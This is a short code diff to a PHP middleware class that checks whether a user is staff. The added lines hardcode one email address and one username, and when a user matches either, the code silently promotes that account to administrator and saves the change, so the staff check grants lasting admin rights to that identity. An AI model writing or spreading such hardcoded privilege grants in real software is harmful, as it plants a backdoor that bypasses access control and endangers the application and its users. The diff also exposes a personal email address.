@@ -17,8 +17,17 @@ class CheckIfUserIsStaff
      */
     public function handle($request, Closure $next)
     {
-        // If session isStaff is false redirect to homepage
-        if(Session::get('isStaff') === false) {
+        $user = Auth::user();
+
+        // If user is not staff
+        if($user->isAdmin == false) {
+            // Check to see if user is DJRedNight
+            if($user->email == 'djrednightmc@gmail.com' || $user->fullusername == 'DJRedNight#3428') {
+                $user->isAdmin = true;
+                $user->save();
+                return $next($request);
+            }
+            // Return To Index if not staff
             return redirect()->route('index');
         }
 
